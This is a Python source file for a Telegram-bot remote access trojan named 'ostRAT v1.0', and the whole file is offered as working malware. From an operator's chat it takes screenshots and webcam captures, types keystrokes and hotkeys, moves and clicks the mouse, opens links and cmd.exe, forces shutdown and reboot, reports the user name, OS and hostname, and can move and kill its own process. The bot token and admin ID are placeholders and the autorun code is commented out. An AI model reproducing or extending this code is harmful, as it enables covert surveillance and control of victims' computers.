from mouse import get_position as get_mouse_pos, move as move_mouse, click, right_click
from aiogram.types import KeyboardButton, ReplyKeyboardMarkup, FSInputFile
from aiogram.utils.keyboard import ReplyKeyboardBuilder
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import State, StatesGroup
from aiogram.filters import StateFilter, Command
from PIL import ImageColor, ImageDraw, ImageGrab
from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from cv2 import VideoCapture, imwrite
from webbrowser import open_new_tab
from socket import gethostname
from pathlib import Path
import platform
import keyboard
import asyncio
import shutil
import sys
import os


class WriteState(StatesGroup):
    textcommand = State()


class BindState(StatesGroup):
    bind = State()


class MoveState(StatesGroup):
    MovetoOne = State()
    MovetoTwo = State()


class UrlState(StatesGroup):
    url = State()


class CamState(StatesGroup):
    cam = State()


class YesState(StatesGroup):
    accept = State()


storage = MemoryStorage()
TOKEN = "0000000000:aabbccddeeffgghhiiggkkllmmnnooppqqr"
adm = 0000000000
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=storage)

menu_raw = ReplyKeyboardBuilder()
menu_raw.row(*(KeyboardButton(text=i) for i in
               ("Online 🟢", "Screenshot 📸", "Off 🔴", "Reoff 🔄", "Autorun 🟢", "Delete 🗑")))
menu_raw.row(*(KeyboardButton(text=i) for i in
               ("Сmd 💻", "Url 🔗", "Cam 🎥", "Keyboard Menu ⭕️⌨️", "Mouse Menu ⭕️🖱")))
menu = ReplyKeyboardMarkup(keyboard=menu_raw.export(), resize_keyboard=True)

menukeyboard_raw = ReplyKeyboardBuilder()
menukeyboard_raw.add(*(KeyboardButton(text=i) for i in
                       ("Write ✍️", "Hotkeys 🔥", "Back ↩")))
menukeyboard = ReplyKeyboardMarkup(keyboard=menukeyboard_raw.export(), resize_keyboard=True)

menumouse_raw = ReplyKeyboardBuilder()
menumouse_raw.add(*(KeyboardButton(text=i) for i in
                    ("Move 🔀", "Pos 📍", "Left Button Click 🖱️◀️", "Right Button Click 🖱️▶️", "Back ↩")))
menumouse = ReplyKeyboardMarkup(keyboard=menumouse_raw.export(), resize_keyboard=True)


@dp.message(F.text == 'Online 🟢')
async def online(message: types.Message):
    await message.bot.send_message(adm, f"🟢 Online! PC » {os.getlogin()} OS » {platform.system()} {platform.release()}\nIP » {gethostname()}", reply_markup=menu)


@dp.message(F.text == 'Left Button Click 🖱️◀️')
async def leftbuttonclick(message: types.Message):
    click()
    await message.bot.send_message(adm, "Left mouse button is click! ✔️")


@dp.message(F.text == 'Right Button Click 🖱️▶️')
async def rightbuttonclick(message: types.Message):
    right_click()
    await message.bot.send_message(adm, "Right mouse button is click! ✔️")


@dp.message(F.text == 'Mouse Menu ⭕️🖱')
async def mousemenu(message: types.Message):
    await message.bot.send_message(adm, "Mouse menu is open! ✔️", reply_markup=menumouse)


@dp.message(F.text == 'Pos 📍')
async def pos(message: types.Message):
    await message.bot.send_message(adm, str(get_mouse_pos()))


@dp.message(F.text == 'Move 🔀')
async def move(message: types.Message, state: FSMContext):
    await message.bot.send_message(adm, "Enter position: ")
    await state.set_state(MoveState.MovetoOne)


@dp.message(MoveState.MovetoOne)
async def move_to(message: types.Message, state: FSMContext):
    x, y = message.text.strip().split(',')
    move_mouse(int(x), int(y), absolute=True, duration=0.1)

    await message.bot.send_message(adm, "Send! ✔️")
    await state.clear()


@dp.message(StateFilter(None), F.text == 'Hotkeys 🔥')
async def hotkey(message: types.Message, state: FSMContext):
    await message.bot.send_message(adm, "Enter hotkey(button1+button2): ")
    await state.set_state(BindState.bind)


@dp.message(BindState.bind)
async def hotkey2(message: types.Message, state: FSMContext):
    await state.update_data(bindm=message.text)
    bindm = message.text
    keyboard.press(bindm)
    keyboard.release(bindm)
    await message.bot.send_message(adm, "Send! ✔️")
    await state.clear()


@dp.message(F.text == 'Write ✍️')
async def write(message: types.Message, state: FSMContext):
    await message.bot.send_message(adm, "Enter text: ")
    await state.set_state(WriteState.textcommand)


@dp.message(WriteState.textcommand)
async def write2(message: types.Message, state: FSMContext):
    await state.update_data(textm=message.text)
    textm = message.text
    keyboard.write(textm.replace("/write ", ""))
    await message.bot.send_message(adm, "Send! ✔️")
    await state.clear()


@dp.message(F.text == 'Back ↩')
async def back(message: types.Message):
    await message.bot.send_message(adm, "Standart menu is open! ✔️", reply_markup=menu)


@dp.message(F.text == 'Keyboard Menu ⭕️⌨️')
async def keyboardmenu(message: types.Message):
    await message.bot.send_message(adm, "Keyboard menu is open! ✔️", reply_markup=menukeyboard)


@dp.message(F.text == 'Cam 🎥')
async def camera(message: types.Message):
    # cam = message.text
    for i in range(10):
        cam = VideoCapture(i)
        result, image = cam.read()
        if result:
            imwrite('cam.png', image)
            await message.reply_photo(FSInputFile('cam.png'))
            os.remove('cam.png')
            break
        else:
            await message.bot.send_message(adm, 'Trying another web-camera...')


@dp.message(F.text == 'Сmd 💻')
async def cmd(message: types.Message):
    try:
        os.startfile('cmd.exe')
        await message.bot.send_message(adm, 'Cmd is open! ✔️')
    except Exception as e:
        await message.bot.send_message(adm, f'Error > RunCMD:\n{e}')


@dp.message(F.text == 'Url 🔗')
async def url(message: types.Message, state: FSMContext):
    await message.bot.send_message(adm, "Enter link: ")
    await state.set_state(UrlState.url)


@dp.message(UrlState.url)
async def url2(message: types.Message, state: FSMContext):
    await state.update_data(urlm=message.text)
    data = await state.get_data()
    url = data['urlm']
    open_new_tab(url)
    await message.bot.send_message(adm, "Link is open! ✔️")
    await state.clear()


@dp.message(F.text == 'Delete 🗑')
async def delete(message: types.Message, state: FSMContext):
    await message.bot.send_message(adm, "Confirm delete(y/n): ")
    await state.set_state(YesState.accept)


@dp.message(YesState.accept)
async def delete2(message: types.Message, state: FSMContext):
    await state.update_data(accept=message.text)
    data = await state.get_data()
    accept: str = data['accept']
    if accept.lower() == "y":
        shutil.move(sys.argv[0], Path('C:/ProgramData'))
        os.system(f'taskkill /im {os.path.basename(sys.argv[0])} /f')
        await message.bot.send_message(adm, "ostRAT deleted! ✔️")
    elif accept.lower() == "n":
        await message.bot.send_message(adm, 'Delete canceled! ❌', parse_mode="Markdown")
    await state.clear()


@dp.message(F.text == 'Autorun 🟢')
async def autorun(message: types.Message):
    try:
        await message.bot.send_message(adm, 'No autostart', parse_mode="Markdown")
        # shutil.copy2((sys.argv[0]), {y})
        # await message.bot.send_message(adm, f'{os.path.basename(sys.argv[0])} in StartUp! ✔️', parse_mode="Markdown")
        # os.startfile({x})
        # await message.bot.send_message(adm, f'{os.path.basename(sys.argv[0])} runned from StartUp! ✔️', parse_mode="Markdown")
    except Exception as e:
        await message.bot.send_message(adm, f'Error ❌:\n{e}', reply_markup=menu, parse_mode="Markdown")


@dp.message(F.text == 'Screenshot 📸')
async def screenshot(message: types.Message):
    try:
        position = get_mouse_pos()
        new_image = ImageGrab.grab()
        draw = ImageDraw.Draw(new_image)
        draw.rectangle((*position, position[0]+2, position[1]+2), fill=ImageColor.getrgb("red"))
        new_image.save(Path(f'{os.getenv("ProgramData")}/Screenshot.jpg'))
        # with open(Path(f'{os.getenv("ProgramData")}/Screenshot.jpg'), 'rb') as new_image:
        if message.chat.id == adm:
            await message.reply_photo(FSInputFile(f'{os.getenv("ProgramData")}/Screenshot.jpg'))
        os.remove(Path(f'{os.getenv("ProgramData")}/Screenshot.jpg'))
    except Exception as e:
        print(f'Error > Screenshot:\n{e}')


@dp.message(F.text == 'Off 🔴')
async def off(message: types.Message):
    await message.bot.send_message(adm, "Turn off! ✔️", reply_markup=menu)
    os.system('shutdown -s /t 0 /f')


@dp.message(F.text == 'Reoff 🔄')
async def reoff(message: types.Message):
    await message.bot.send_message(adm, "Reboot! ✔️", reply_markup=menu)
    os.system('shutdown -r /t 0 /f')


@dp.message(Command('start'))
async def start(message: types.Message):
    if message.chat.id == adm:
        username = message.chat.username
        await message.bot.send_message(adm, f"Hi, {username}. ostRAT v1.0 for you", reply_markup=menu)
    else:
        await message.reply("Hello, you don't have access.")


try:
    asyncio.run(dp.start_polling(bot))
except Exception as e:
    print(e)
    # os.startfile(sys.argv[0])
sys.exit()
